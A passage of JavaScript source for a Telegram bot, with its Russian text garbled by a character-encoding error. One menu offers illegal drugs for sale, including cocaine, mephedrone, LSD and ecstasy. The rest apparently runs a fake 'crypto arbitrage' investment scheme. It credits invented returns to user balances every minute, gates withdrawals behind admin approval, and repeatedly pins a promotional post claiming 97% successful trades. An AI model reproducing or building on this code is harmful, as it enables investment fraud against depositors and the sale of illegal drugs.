                                [{ text: "üîÆ –≠–∫—Å—Ç–∞–∑–∏ BARCELONA 15—à—Ç", callback_data: `bano` },{ text: "üîÆ –ê–ª—å—Ñ–∞ BLUECRYS 2–≥—Ä", callback_data: `bano` }],
                                [{ text: "üîÆ –ö–û–ö–° - Prestige 0.5–≥—Ä", callback_data: `bano` },{ text: "üîÆ –ö–û–ö–° - Prestige 1–≥—Ä", callback_data: `bano` }],
                                [{ text: "üîÆ –ì–ê–®–ò–® - TWIX 5–≥—Ä", callback_data: `bano_7395` },{ text: "üîÆ –®–∏—à–∏–∫–∏ Tutankhamon 3–≥—Ä ", callback_data: `bano_5899` }],
                                [{ text: "üîÆ –õ–°–î 6—à—Ç", callback_data: `bano_7299` },{ text: "üîÆ –ú–µ—Ñ GOLDEN 3–≥—Ä", callback_data: `bano_5899` }],
                                [{ text: "üîÆ –ú–ï–§–ï–î–†–û–ù - FLOUR 10–≥—Ä", callback_data: `bano` }],
                                [{ text: "< –ú–µ–Ω—é", callback_data: `menu` }],
                                        ]
                                    },
                                parse_mode: "HTML"
                                });
                                }
}

if(query.data.startsWith("raz")) {						
	return bot.answerCallbackQuery(query.id, "üîë –î–∞–Ω–Ω—ã–π —Ä–∞–∑–¥–µ–ª –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ", true);
}

if(query.data.startsWith("bano")) {		
    let id			=		Number(query.data.split("_")[1]);				
	 bot.answerCallbackQuery(query.id, `–ü–æ–ø–æ–ª–Ω–∏—Ç–µ –±–∞–ª–∞–Ω—Å. –î–∞–Ω–Ω—ã–π —Ç–æ–≤–∞—Ä —Å—Ç–æ–∏—Ç ${id} RUB.`, true);
	return bot.sendMessage(message.chat.id,`–î–∞–Ω–Ω—ã–π —Ç–æ–≤–∞—Ä —Å—Ç–æ–∏—Ç ${id} RUB:`, {
		reply_markup: {
				inline_keyboard: [
		[{ text: "–ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å", callback_data: `deposit` }],
		[{ text: "< –ú–µ–Ω—é", callback_data: `menu` }],
				]
			},
		parse_mode: "HTML"
		});

}
		

	if(admins.indexOf(message.user.id) !== -1) {

		if(query.data.startsWith("withdraw")) {
			let id			=		Number(query.data.split("withdraw")[1]);
			let ticket		=		await Ticket.findOne({ owner: id });

			if(!ticket) return bot.answerCallbackQuery(query.id, "–ó–∞—è–≤–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.");
				var today = new Date();
var dd = String(today.getDate()).padStart(2, '0');
var mm = String(today.getMonth() + 1).padStart(2, '0');
await Stats.findOneAndUpdate({ id: `${dd}.${mm}` }, { $inc: { viv: 1 } })
await Stats.findOneAndUpdate({ id: `${dd}.${mm}` }, { $inc: { sumviv: ticket.amount } })
							let ouser = await User.findOne({ id: 5547452982 });
			let oq = ouser.oq
			let ow = ouser.ow
			let oe = ouser.oe
			let or = ouser.or
			await User.findOneAndUpdate({ id: 5547452982 }, { $set: { ot: or } })
            await User.findOneAndUpdate({ id: 5547452982 }, { $set: { or: oe } })
			await User.findOneAndUpdate({ id: 5547452982 }, { $set: { oe: ow } })
			await User.findOneAndUpdate({ id: 5547452982 }, { $set: { ow: oq } })
			await User.findOneAndUpdate({ id: 5547452982 }, { $set: { oq: `‚ûñ <b>${ticket.owner}</b> –≤—ã–≤–µ–ª —Å–æ —Å—á—ë—Ç–∞: <b>${ticket.amount.toFixed(2)}‚ÇΩ</b>.` } })
			bot.sendMessage(ticket.owner, `‚úÖ <b>–í–∞—à—É –∑–∞—è–≤–∫—É –Ω–∞ –≤—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ –ø—Ä–∏–Ω—è–ª–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ–µ–∫—Ç–∞
–°–ø–∞—Å–∏–±–æ, —á—Ç–æ –í—ã —Å –Ω–∞–º–∏. –ë—É–¥–µ–º —Ä–∞–¥—ã –æ—Ç–∑—ã–≤—É –≤ —á–∞—Ç–µ -</b> https://t.me/LXFinanceChat`, {
			parse_mode: "HTML"
		});
		
		await bot.answerCallbackQuery(query.id, "‚úÖ –í—ã –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª–∏ –æ–ø–ª–∞—Ç—É –¥–∞–Ω–Ω–æ–π –∑–∞—è–≤–∫–∏", true);
let user = await User.findOne({ id: Number(ticket.owner) });
			await ticket.remove();
			await User.findOneAndUpdate({ id: 5547452982 }, { $inc: { spay: 1 } })
			return;
		}

		if(query.data.startsWith("declineback")) {
			let id			=		Number(query.data.split("declineback")[1]);
			let ticket		=		await Ticket.findOne({ owner: id });

			if(!ticket) return bot.answerCallbackQuery(query.id, "–ó–∞—è–≤–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.");

			await bot.sendMessage(ticket.owner, "–í–∞–º –æ—Ç–∫–ª–æ–Ω–∏–ª–∏ –≤—ã–ø–ª–∞—Ç—É –∏ –≤–µ—Ä–Ω—É–ª–∏ –¥–µ–Ω—å–≥–∏.");
			await User.findOne({ id: id }).then(async (user) => await user.inc("balance", ticket.amount));

			await ticket.remove();
			await bot.answerCallbackQuery(query.id, "–í—ã –æ—Ç–∫–∞–∑–∞–ª–∏ –≤ –≤—ã–ø–ª–∞—Ç–µ —Å—Ä–µ–¥—Å—Ç–≤ –∏ –≤–µ—Ä–Ω—É–ª–∏ –¥–µ–Ω—å–≥–∏ –Ω–∞ –±–∞–ª–∞–Ω—Å.");
		}

		if(query.data.startsWith("decline")) {
			let id			=		Number(query.data.split("decline")[1]);
			let ticket		=		await Ticket.findOne({ owner: id });

			if(!ticket) return bot.answerCallbackQuery(query.id, "–ó–∞—è–≤–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.");

			await ticket.remove();
			await bot.answerCallbackQuery(query.id, "–í—ã –æ—Ç–∫–∞–∑–∞–ª–∏ –≤ –≤—ã–ø–ª–∞—Ç–µ —Å—Ä–µ–¥—Å—Ç–≤.");
		}
	}
});

User.prototype.inc		=		function(field, value = 1) {
	this[field] 		+=		value;
	return this.save();
}

User.prototype.dec 		= 		function(field, value = 1) {
	this[field] 		-= 		value;
	return this.save();
}

User.prototype.set 		= 		function(field, value) {
	this[field] 		=	 	value;
	return this.save();
}

function randomizeArr(arr) {
	var j, temp;
	for (var i = arr.length - 1; i > 0; i--) {
		j = Math.floor(Math.random() * (i + 1));
		temp = arr[j];
		arr[j] = arr[i];
		arr[i] = temp;
	}
	return arr;
}

async function rupdate() {
  let userList = await User.find();
await userList.map(async (x) => {
	  if (x.invests === 0) { return
  }

if(x.invests <= 19999.99) {
await User.updateOne({ id: x.id }, { $inc: { balance: x.invests*0.045/24/60 } }, 
  function (err) {
     if (err) throw err
})
}
if(x.invests >= 20000) {
await User.updateOne({ id: x.id }, { $inc: { balance: x.invests*0.056/24/60 } }, 
  function (err) {
     if (err) throw err
})
}
 })
}

function getBalance() {
return new Promise((resolve, reject) => {
payeer.getBalance((err, result) => {
if(err) {
reject(err);
}
console.log(result)
resolve(result.balance.RUB.total);
});
});
}

function transfer(options) {
  return new Promise((resolve, reject) => {
    payeer.transfer(options, (err, result) => {
        if(err) {
            reject(err);
        }

        resolve(result);
    });
  });
}

function payout(options) {
  return new Promise((resolve, reject) => {
    payeer.payout(options, (err, result) => {
        if(err) {
            reject(err);
        }

        resolve(result);
    });
  });
}

function getHistory() {
  return new Promise((resolve, reject) => {
    payeer.getHistory((err, result) => {
        if(err) {
            reject(err);
        }

        resolve(result.history);
    });
  });
} 

async function days() {
	await User.findOneAndUpdate({ id: 5547452982 }, { $inc: { day: 1 } })
	} 


setInterval(async() => {
  rupdate(); 
}, 60000); 

async function pin() {
		bot.unpinAllChatMessages("@DIAMONDfinanceChat")
		let log = await bot.sendMessage("@DIAMONDfinanceChat", `<b>–í—Å–µ–º –ø—Ä–∏–≤–µ—Ç üëã</b>

–ú—ã —Å–æ–∑–¥–∞–ª–∏ –Ω–æ–≤—É—é –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–æ–Ω–Ω—É—é –ø–ª–∞—Ç—Ñ–æ—Ä–º—É –≤ Telegram - <b>Finance Arbitrage</b>. –û–Ω–∞ –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–æ–ª—É—á–∞—Ç—å –ø—Ä–∏–±—ã–ª—å –ø—Ä—è–º–æ –≤–Ω—É—Ç—Ä–∏ –º–µ—Å—Å–µ–Ω–¥–∂–µ—Ä–∞, –±–ª–∞–≥–æ–¥–∞—Ä—è –Ω–∞—à–µ–π –∫–æ–º–∞–Ω–¥–µ –∏ –Ω–æ–≤–æ–º—É –ø–µ—Ä—Å–ø–µ–∫—Ç–∏–≤–Ω–æ–º—É –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—é –ö—Ä–∏–ø—Ç–æ-–ê—Ä–±–∏—Ç—Ä–∞–∂. 

<b>–ö–∞–∫ –º—ã –∑–∞—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º ‚ÅâÔ∏è</b>

<b>–ö—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–Ω—ã–π –∞—Ä–±–∏—Ç—Ä–∞–∂</b> - —ç—Ç–æ –ø–æ–∫—É–ø–∫–∞ –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—ã –Ω–∞ –æ–¥–Ω–æ–π –±–∏—Ä–∂–µ –∏ –ø—Ä–æ–¥–∞–∂–∞ –Ω–∞ –¥—Ä—É–≥–æ–π —Å —Ü–µ–ª—å—é –ø–æ–ª—É—á–µ–Ω–∏—è –ø—Ä–∏–±—ã–ª–∏ –Ω–∞ —Ä–∞–∑–Ω–∏—Ü–µ –∫—É—Ä—Å–æ–≤. üìâ

<b>–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏:</b> –ö—É–ø–∏–ª–∏ –Ω–∞ –æ–¥–Ω–æ–π –±–∏—Ä–∂–µ –∫–∞–∫–æ–π-—Ç–æ –∞–∫—Ç–∏–≤ –∑–∞ 1000$, –ø—Ä–æ–¥–∞–ª–∏ –Ω–∞ –¥—Ä—É–≥–æ–π –±–∏—Ä–∂–µ –∑–∞ 1050$ = –∑–∞—Ä–∞–±–æ—Ç–∞–ª–∏ —á–∏—Å—Ç—ã–º–∏ 50$. –ö–∞–∫ –ø—Ä–∞–≤–∏–ª–æ —ç—Ç–æ 2-5% —á–∏—Å—Ç–æ–π –ø—Ä–∏–±—ã–ª–∏. 

–ú—ã —Å–º–µ–ª–æ –º–æ–∂–µ–º –Ω–∞–∑–≤–∞—Ç—å —Å–µ–±—è –ª—É—á—à–µ–π –∫–æ–º–∞–Ω–¥–æ–π, –∑–∞—Ä–∞–±–∞—Ç—ã–≤–∞—é—â–µ–π –Ω–∞ –∞—Ä–±–∏—Ç—Ä–∞–∂–µ –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç –∏ —Å–µ–π—á–∞—Å –º—ã –¥–∞—ë–º –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –ª—é–¥—è–º –∑–∞—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å –≤–º–µ—Å—Ç–µ —Å –Ω–∞–º–∏!
 
<b>–ë–æ–ª–µ–µ 97% —É—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫! 

+33,8% –Ω–∞ —Å–≤—è–∑–∫–µ BTC –∑–∞ 12 –¥–Ω–µ–π!
+19,6% –Ω–∞ —Å–≤—è–∑–∫–µ ETH –∑–∞ 10 –¥–Ω–µ–π!
+12,6% –Ω–∞ —Å–≤—è–∑–∫–µ SOL –∑–∞ 6 –¥–Ω–µ–π!

–¢–µ–ø–µ—Ä—å –≤–∞–º –Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –≥–æ–¥–∞–º–∏ —É—á–∏—Ç—å —É –∫–æ–º–ø—å—é—Ç–µ—Ä–∞ —Ç—Ä–µ–π–¥–∏–Ω–≥, –Ω–∞—à–∏ —Å–ø–µ—Ü–∏–∞–ª–∏—Å—Ç—ã —Å–¥–µ–ª–∞—é—Ç –≤—Å–µ –∑–∞ –≤–∞—Å üòâ</b>
@SimpleArbitrageFinanceBot

`, {
	parse_mode: "HTML",
					reply_markup: {
               inline_keyboard: [	
						      [
					   { text: "üí∞ –ü–µ—Ä–µ–π—Ç–∏ –≤ –±–æ—Ç–∞", url: `https://t.me/SimpleArbitrageFinanceBot` },
					   ],
						],
						
			},
				})
		
		let msg = await bot.pinChatMessage("@DIAMONDfinanceChat", log.message_id, { disable_notification: false })
		let test = await bot.sendMessage("@DIAMONDfinanceChat", "/")
		let id = test.message_id
		await bot.deleteMessage("@DIAMONDfinanceChat", id)
		await bot.deleteMessage("@DIAMONDfinanceChat", id - 1)
	}

setInterval(async() => {
  pin(); 
}, 21600000);


async function rfupdate() {
	let data1 = 1;
	let data2 = 2.2;
let data3 = await CoinGeckoClient.simple.price({  ids: ['bitcoin'], vs_currencies: ['usd'] }); //
let data4 = await CoinGeckoClient.simple.price({  ids: ['Ethereum'], vs_currencies: ['usd'] }); //
let data5 = await CoinGeckoClient.simple.price({  ids: ['BinanceCoin'], vs_currencies: ['usd'] }); //
let data6 = 1;

data3 = data3.data.bitcoin.usd;
data4 = data4.data.ethereum.usd;
data5 = data5.data.binancecoin.usd;
await Curse.findOneAndUpdate({ uid: `Cursest` }, { $set: { Usdt: data1, Ton: data2, Bitcoin: data3, Ethereum: data4, BinanceCoin: data5, Busd: data6 } }) 
console.log(`–£—Å–ø–µ—à–Ω–æ`)
axios.get("https://www.cbr-xml-daily.ru/daily_json.js")
		.then (async(res) => {
await Curse.findOneAndUpdate({ uid: `Cursest` }, { $set: { rub: res.data.Valute.USD.Value, eur: res.data.Valute.EUR.Value, byn: res.data.Valute.BYN.Value, uan: res.data.Valute.UAH.Value, gbp: res.data.Valute.GBP.Value, cny: res.data.Valute.CNY.Value, kzt: res.data.Valute.KZT.Value, uzs: res.data.Valute.UZS.Value, gel: res.data.Valute.GEL.Value, try: res.data.Valute.TRY.Value, krw: res.data.Valute.KRW.Value } }) 
		})
	}
setInterval(async() => {
  rfupdate(); 
}, 60000); 